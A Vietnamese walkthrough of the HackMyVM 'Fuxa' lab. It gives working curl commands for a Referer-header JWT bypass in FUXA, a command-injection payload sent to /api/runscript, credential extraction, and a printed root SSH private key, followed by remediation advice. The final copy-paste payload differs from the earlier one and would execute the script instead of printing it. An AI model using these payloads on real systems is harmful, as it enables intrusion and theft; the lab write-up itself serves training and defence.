# HackMyVM — Fuxa

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` (hoặc IP Kali của bạn) |
| Máy Fuxa (Target) | `10.0.2.11` |
| SSH | `22/tcp` — OpenSSH 10.0p2 Debian 7+deb13u1 |
| HTTP | `80/tcp` — Apache httpd 2.4.66 (proxy FUXA) |
| FUXA API | `1881/tcp` — Node.js Express |
| Tài khoản user | `git` |
| Mật khẩu user | `wi3fw39w0j12e` |

> **Quy ước terminal**
>
> - 🟦 **Terminal Kali**: trinh sát, bypass auth, RCE, SSH.
> - 🟥 **Trên Target (qua SSH)**: đọc flag, extract key, xác nhận quyền.
>
> Đặt biến IP trước khi chạy mọi lệnh:

```bash
ip=10.0.2.11
```

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy và các thông tin hỗ trợ đánh giá bảo mật.**

## 1.1. Xác định IP máy Target

### 🟦 Kali

```bash
ip=10.0.2.11
ping -c 4 $ip
```

Máy Target đang hoạt động.

---

## 1.2. Quét toàn bộ cổng TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 --min-rate 5000 $ip
```

Kết quả quan trọng:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1881/tcp open  ibm-mqseries2
```

Ba cổng TCP đang mở: SSH, HTTP (Apache) và FUXA backend.

---

## 1.3. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -p 22,80,1881 -sCV -Pn -T4 --min-rate 5000 $ip
```

Kết quả:

```text
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: FUXA
|_http-server-header: Apache/2.4.66 (Debian)
1881/tcp open  http    Node.js Express framework
|_http-title: FUXA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 80: Apache reverse proxy phục vụ frontend FUXA.
- Port 1881: Node.js Express backend FUXA.
- Port 22: OpenSSH.

---

## 1.4. Kiểm tra frontend FUXA

### 🟦 Kali

```bash
curl -s http://$ip:80/ | head -20
curl -s http://$ip:1881/ | head -20
```

Cả hai cổng đều trả về trang HTML tiêu đề **FUXA**, xác nhận Apache proxy sang backend Node.js.

---

## 1.5. Kiểm tra yêu cầu xác thực API

### 🟦 Kali

```bash
curl -s http://$ip:1881/api/version
```

Kết quả:

```text
{"error":"unauthorized_error","message":"Authentication required!"}
```

Tất cả endpoint API yêu cầu JWT authentication.

---

## 1.6. Tóm tắt điểm vào tiềm năng

```text
22/tcp   SSH
80/tcp   Apache → FUXA frontend
1881/tcp FUXA Node.js API (JWT protected)
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác các lỗ hổng để đạt quyền truy cập ban đầu, nâng cao đặc quyền và thu thập `user.txt` cùng `root.txt`.**

## 2.1. Bypass JWT Authentication (CVE-2025-69985)

FUXA có lỗ hổng middleware JWT: nếu header `Referer` chứa địa chỉ host của target thì JWT verification bị bỏ qua.

### 🟦 Kali

```bash
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/version
```

Kết quả:

```text
"1.0.0"
```

Bypass thành công. Tiếp tục lấy cấu hình:

```bash
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/settings
```

Một số trường quan trọng:

```text
"secureEnabled": true
"workDir": "/opt/fuxa/_appdata"
"appDir": "/opt/fuxa/FUXA/server"
"uploadFileDir": "/opt/fuxa/_appdata/_upload_files"
"imagesFileDir": "/opt/fuxa/_images"
```

Lưu evidence (tùy chọn):

```bash
mkdir -p ~/Fuxa/evidence
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/version  > ~/Fuxa/evidence/version.json
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/settings > ~/Fuxa/evidence/settings.json
```

---

## 2.2. Phát hiện Command Injection trong script SERVER

### 🟦 Kali

```bash
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/project | python3 -m json.tool | grep -A 20 '"id": "s_maint_preview_bundle"'
```

Script quan trọng:

```text
"id": "s_maint_preview_bundle",
"name": "asset_cache_preview",
"code": "const { execSync } = require('child_process'); const query = (pattern && pattern.value !== undefined) ? String(pattern.value) : String(pattern || ''); return execSync(`/bin/sh -c \"find /opt/fuxa/_images -maxdepth 2 -type f | grep -i ${query}\"`, { encoding: 'utf8' });",
"sync": false,
"parameters": [
    {
        "name": "pattern",
        "type": "value",
        "value": "png"
    }
],
"permission": null,
"mode": "SERVER"
```

**Phân tích lỗ hổng:**

- `mode: SERVER` → chạy phía server.
- `permission: null` → không kiểm soát quyền.
- Biến `query` (từ parameter `pattern`) được nội suy trực tiếp vào lệnh shell qua template string mà **không sanitize**.
- Dẫn đến **command injection** qua command substitution `$(...)`.

---

## 2.3. Khai thác RCE — đọc file chứa credential

Payload dùng `$(...)` và redirect stderr (`>&2`) để output xuất hiện trong JSON response.

### 🟦 Kali

```bash
curl -s -X POST "http://10.0.2.11:1881/api/runscript" \
  -H "Content-Type: application/json" \
  -H "Referer: http://10.0.2.11:1881/fuxa" \
  -d '{"headers":{"normalizedNames":{},"lazyUpdate":null,"lazyInit":null},"params":{"script":{"id":"s_maint_preview_bundle","name":"asset_cache_preview","code":"placeholder","sync":false,"parameters":[{"name":"pattern","type":"value","value":"$(cat /opt/fuxa/FUXA/server/scripts/local-sync.sh >&2)"}],"permission":null,"mode":"SERVER"},"toLogEvent":false}}' \
  | python3 -m json.tool
```

Kết quả (nội dung `local-sync.sh`):

```text
"{\"status\":2,\"signal\":null,\"output\":[null,\"\",\"#!/bin/bash\\nset -euo pipefail\\n\\nLOCAL_HOST=\\\"${1:-127.0.0.1}\\\"\\nGIT_USER=\\\"git\\\"\\nGIT_PASS=\\\"wi3fw39w0j12e\\\"\\nREMOTE_CMD=\\\"/usr/local/bin/theme-refresh --quick\\\"\\n\\nexec /usr/bin/sshpass -p \\\"$GIT_PASS\\\" /usr/bin/ssh \\\\\\n  -o StrictHostKeyChecking=no \\\\\\n  -o UserKnownHostsFile=/dev/null \\\\\\n  \\\"${GIT_USER}@${LOCAL_HOST}\\\" \\\"$REMOTE_CMD\\\"\\nUsage: grep [OPTION]... PATTERNS [FILE]...\\nTry 'grep --help' for more information.\\n\"],\"pid\":4660,\"stdout\":\"\",\"stderr\":\"#!/bin/bash\\nset -euo pipefail\\n\\nLOCAL_HOST=\\\"${1:-127.0.0.1}\\\"\\nGIT_USER=\\\"git\\\"\\nGIT_PASS=\\\"wi3fw39w0j12e\\\"\\nREMOTE_CMD=\\\"/usr/local/bin/theme-refresh --quick\\\"\\n\\nexec /usr/bin/sshpass -p \\\"$GIT_PASS\\\" /usr/bin/ssh \\\\\\n  -o StrictHostKeyChecking=no \\\\\\n  -o UserKnownHostsFile=/dev/null \\\\\\n  \\\"${GIT_USER}@${LOCAL_HOST}\\\" \\\"$REMOTE_CMD\\\"\\nUsage: grep [OPTION]... PATTERNS [FILE]...\\nTry 'grep --help' for more information.\\n\"}"

```

**Credential thu được:**

```text
Username: git
Password: wi3fw39w0j12e
```

Script cron dùng `sshpass` để SSH vào localhost với tài khoản `git` mỗi phút.

> **Lưu ý shell:** Nếu dùng zsh và gặp `zsh: event not found`, hãy chạy lệnh trong bash hoặc đặt payload trong single quote cẩn thận. Payload trên đã hoạt động thành công.

---

## 2.4. SSH as git + lấy user flag

### 🟦 Kali

```bash
# Cài sshpass nếu chưa có
apt install -y sshpass

# Lấy user flag
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 'cat user.txt'
```

Kết quả:

```text
flag{git-ba9f11ecc3497d9993b933fdc2bd61e5}
```

Kiểm tra identity:

```bash
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 'id; whoami; pwd; ls -la'
```

Kết quả:

```text
uid=1001(git) gid=1001(git) groups=1001(git)
git
/home/git
...
-rw------- 1 git  git    43 Dec 20  2025 user.txt
```

**Bằng chứng:** đã truy cập thành công tài khoản `git` và đọc được `user.txt`.

---

## 2.5. Privilege Escalation — Extract root SSH private key

User `git` thuộc group `git` và có quyền đọc bare Git repository ẩn tại:

```text
/opt/.cache-loader/state
```
kiểm tra repo, liệt kê tất cả các object
```bash
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
  'ls -la /opt/.cache-loader/state; GIT_DIR=/opt/.cache-loader/state git rev-list --objects --all'
```
Sau khi có danh sách object, tìm blob
```bash
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
  'GIT_DIR=/opt/.cache-loader/state git cat-file --batch-check --batch-all-objects | grep blob'
```

Blob chứa private key root (ED25519) có hash:

```text
5eabba81b7dc9671da29ba0f45f5b6735bf479f8 blob 399
cbe10abbd6222a4fe029f5274aac4b35dfd65490 blob 32

```
sau đó ta chọn 1 Blob để thực hiện sshpass
```text
5eabba81b7dc9671da29ba0f45f5b6735bf479f8
```

### 🟦 Kali

```bash
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
  'GIT_DIR=/opt/.cache-loader/state git cat-file blob 5eabba81b7dc9671da29ba0f45f5b6735bf479f8'
```

Kết quả:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0wAAAJAy0ok2MtKJ
NgAAAAtzc2gtZWQyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0w
AAAECU4VgU3F+nMQ7Ty/LKklFRFNgHmSnFZTuq1X5TLBwr+bkMjzAvP1KD4M5GIjKHWSY3
7e9rqQb6zsL+hxnl/V7TAAAACnJvb3RATXViYW4BAgM=
-----END OPENSSH PRIVATE KEY-----
```

Comment của key: `root@Muban` → xác nhận thuộc về root.

---

## 2.6. Lưu key và SSH as root

### 🟦 Kali

```bash
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0wAAAJAy0ok2MtKJ
NgAAAAtzc2gtZWQyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0w
AAAECU4VgU3F+nMQ7Ty/LKklFRFNgHmSnFZTuq1X5TLBwr+bkMjzAvP1KD4M5GIjKHWSY3
7e9rqQb6zsL+hxnl/V7TAAAACnJvb3RATXViYW4BAgM=
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key
```

SSH as root và lấy root flag:

```bash
ssh -i /tmp/root_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.0.2.11 'id; cat /root/root.txt'
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
flag{root-a01a6651f93b105d6fa6908d37a43275}
```

**Bằng chứng:** đã leo thang đặc quyền thành công và đọc được `root.txt`.

---

## 2.7. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │
            │ TCP scan → 22, 80, 1881
            ▼
┌────────────────────────┐
│ FUXA API 1881/tcp      │
│ JWT required           │
└───────────┬────────────┘
            │
            │ Referer bypass (CVE-2025-69985)
            ▼
┌────────────────────────┐
│ /api/project           │
│ s_maint_preview_bundle │
│ Command Injection      │
└───────────┬────────────┘
            │
            │ POST /api/runscript
            │ $(cat local-sync.sh)
            ▼
┌────────────────────────┐
│ Credential             │
│ git : wi3fw39w0j12e    │
└───────────┬────────────┘
            │
            │ SSH 22/tcp
            ▼
┌────────────────────────┐
│ git@target             │
│ Đọc user.txt           │
└───────────┬────────────┘
            │
            │ GIT_DIR=/opt/.cache-loader/state
            │ git cat-file blob 5eabba...
            ▼
┌────────────────────────┐
│ Root ED25519 private   │
│ key extracted          │
└───────────┬────────────┘
            │
            │ SSH -i root_key
            ▼
┌────────────────────────┐
│ uid=0(root)            │
│ Đọc /root/root.txt     │
└────────────────────────┘
```

---

## 2.8. Toàn bộ lệnh copy-paste (từ đầu đến cuối)

### 🟦 TERMINAL KALI — chạy tuần tự

```bash
# ===== 0. Chuẩn bị =====
ip=10.0.2.11

# ===== 1. Recon =====
nmap -p- -Pn -T4 --min-rate 5000 $ip
nmap -p 22,80,1881 -sCV -Pn -T4 --min-rate 5000 $ip

curl -s http://$ip:80/ | head -20
curl -s http://$ip:1881/ | head -20
curl -s http://$ip:1881/api/version

# ===== 2. Auth Bypass =====
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/version
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/settings

# ===== 3. Tìm script injection =====
curl -s -H "Referer: http://10.0.2.11:1881/fuxa" http://10.0.2.11:1881/api/project \
  | python3 -m json.tool | grep -A 20 '"id": "s_maint_preview_bundle"'

# ===== 4. RCE — lấy credential =====
curl -s -X POST "http://10.0.2.11:1881/api/runscript" \
  -H "Content-Type: application/json" \
  -H "Referer: http://10.0.2.11:1881/fuxa" \
  -d '{"headers":{"normalizedNames":{},"lazyUpdate":null,"lazyInit":null},"params":{"script":{"id":"s_maint_preview_bundle","name":"asset_cache_preview","code":"placeholder","sync":false,"parameters":[{"name":"pattern","type":"value","value":"$(cat /opt/fuxa/FUXA/server/scripts/local-sync.sh | base64 | base64 -d|bash >&2)"}],"permission":null,"mode":"SERVER"},"toLogEvent":false}}' \
  | python3 -m json.tool | grep -A 30 '"stderr"'

# ===== 5. SSH as git + user flag =====
apt install -y sshpass

sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 'cat user.txt'
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 'id; whoami; pwd; ls -la'

# ===== 6. Extract root private key =====
sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
  'GIT_DIR=/opt/.cache-loader/state git cat-file blob 5eabba81b7dc9671da29ba0f45f5b6735bf479f8'

# ===== 7. Lưu key + SSH as root =====
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0wAAAJAy0ok2MtKJ
NgAAAAtzc2gtZWQyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0w
AAAECU4VgU3F+nMQ7Ty/LKklFRFNgHmSnFZTuq1X5TLBwr+bkMjzAvP1KD4M5GIjKHWSY3
7e9rqQb6zsL+hxnl/V7TAAAACnJvb3RATXViYW4BAgM=
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/root_key

ssh -i /tmp/root_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.0.2.11 'id; cat /root/root.txt'
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác và đề xuất biện pháp ngăn chặn truy cập trái phép, leo thang đặc quyền.**

## 3.1. Nguyên nhân chính

Ba điểm yếu kết hợp tạo thành chuỗi tấn công hoàn chỉnh.

### 1. JWT Authentication Bypass (CVE-2025-69985)

Middleware JWT của FUXA kiểm tra header `Referer`. Nếu Referer chứa địa chỉ host của server thì xác thực bị bỏ qua hoàn toàn. Bất kỳ ai cũng có thể gọi API mà không cần token.

### 2. Command Injection trong script SERVER

Script `s_maint_preview_bundle` dùng `child_process.execSync` với template string:

```javascript
execSync(`/bin/sh -c "find ... | grep -i ${query}"`)
```

Giá trị `query` đến từ parameter người dùng, không được sanitize → command substitution `$(...)` thực thi lệnh tùy ý với quyền của tiến trình Node.js (www-data).

### 3. Credential cứng trong script + private key root trong Git repo

- File `/opt/fuxa/FUXA/server/scripts/local-sync.sh` chứa plaintext password `git:wi3fw39w0j12e`.
- Bare Git repository `/opt/.cache-loader/state` (đọc được bởi group `git`) chứa blob private key SSH của root.

### 4. Chuỗi tác động

```text
Referer bypass
        +
Command Injection (execSync + unsanitized template)
        +
Hardcoded credential trong script
        +
Root private key trong Git repo nhóm git
        =
RCE as www-data → SSH as git → SSH as root
```

---

## 3.2. Biện pháp khắc phục

### Sửa JWT middleware

- Loại bỏ hoàn toàn logic bypass dựa trên Referer.
- Luôn yêu cầu JWT hợp lệ cho mọi endpoint API.
- Áp dụng rate-limiting và logging cho các request không có token.

### Ngăn Command Injection

- Không bao giờ nội suy input người dùng trực tiếp vào shell command.
- Nếu cần chạy lệnh, dùng danh sách tham số (array) thay vì chuỗi shell, hoặc whitelist giá trị cho phép.
- Disable hoặc hạn chế nghiêm ngặt các script `mode: SERVER` có `permission: null`.
- Sandbox / chạy script với user riêng có quyền tối thiểu.

### Bảo vệ credential và secret

- Không lưu mật khẩu plaintext trong script.
- Dùng secret manager, environment variable được bảo vệ, hoặc SSH key-based auth không cần password.
- Thu hồi ngay credential đã lộ (`git` password và root private key).
- Xóa hoặc bảo vệ bare Git repository chứa private key; không để group thông thường đọc được.

### Gia cố SSH

- Vô hiệu hóa đăng nhập bằng mật khẩu nếu có thể; chỉ dùng public key.
- Giới hạn `AllowUsers` / `AllowGroups`.
- Chặn nguồn truy cập cổng 22 bằng firewall nếu không cần thiết từ mạng ngoài.
- Theo dõi đăng nhập bất thường.

### Least Privilege + Capability / Permission review

- Tiến trình FUXA chạy với user riêng, không phải www-data nếu có thể.
- Kiểm tra định kỳ:

```bash
getcap -r / 2>/dev/null
find / -perm -4000 -o -perm -2000 2>/dev/null
```

- Không lưu private key root ở nơi user thường có thể đọc.

### Logging và giám sát

Theo dõi:

- Request tới `/api/runscript` và các endpoint nhạy cảm.
- Request thiếu JWT hoặc có Referer bất thường.
- Lệnh shell được spawn từ tiến trình Node.js.
- Đăng nhập SSH bằng tài khoản `git` và `root`.
- Thay đổi đối với file trong `/opt/fuxa` và `/opt/.cache-loader`.

---

# Kết luận ngắn gọn

## Câu 1

Target:

```text
10.0.2.11
```

Dịch vụ được xác nhận:

```text
22/tcp   SSH — OpenSSH 10.0p2 Debian 7+deb13u1
80/tcp   Apache 2.4.66 — FUXA frontend
1881/tcp Node.js Express — FUXA backend
```

## Câu 2

Initial access:

```text
Referer JWT bypass → Command Injection → local-sync.sh → git:wi3fw39w0j12e
```

User flag:

```text
flag{git-ba9f11ecc3497d9993b933fdc2bd61e5}
```

Điểm leo thang đặc quyền:

```text
Bare Git repo /opt/.cache-loader/state
blob 5eabba81b7dc9671da29ba0f45f5b6735bf479f8 → root ED25519 private key
```

Root flag:

```text
flag{root-a01a6651f93b105d6fa6908d37a43275}
```

## Câu 3

Khắc phục trọng tâm:

```text
Sửa JWT middleware (không bypass bằng Referer)
            +
Ngăn Command Injection (không nội suy input vào shell)
            +
Xóa credential cứng + bảo vệ Git repo chứa private key
            +
Gia cố SSH + Least Privilege
            +
Logging + Monitoring
```
